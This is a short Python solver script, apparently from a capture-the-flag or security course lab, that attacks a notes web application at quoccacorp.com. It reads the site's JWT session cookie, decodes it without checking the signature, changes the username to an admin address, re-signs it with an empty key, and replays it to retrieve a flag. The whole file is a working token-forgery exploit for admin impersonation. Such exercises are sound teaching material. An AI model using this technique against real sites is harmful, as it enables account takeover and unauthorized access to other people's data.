import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import jwt

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        URL = "https://notes.quoccacorp.com"

        response = self.session.get(URL)
        cookie_key_name = response.cookies.keys()[0]
        original_jwt = response.cookies.get(cookie_key_name)

        jwt_payload_data = jwt.decode(original_jwt, options={"verify_signature": False})
        jwt_payload_data["Username"] = "admin@quoccacorp.com"
        jwt_payload_data["exp"] = jwt_payload_data["exp"] + 1

        new_jwt = jwt.encode(jwt_payload_data, key="", algorithm="HS256")

        self.session.cookies.clear()
        self.session.cookies.set(cookie_key_name, new_jwt)

        response = self.session.get(URL)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()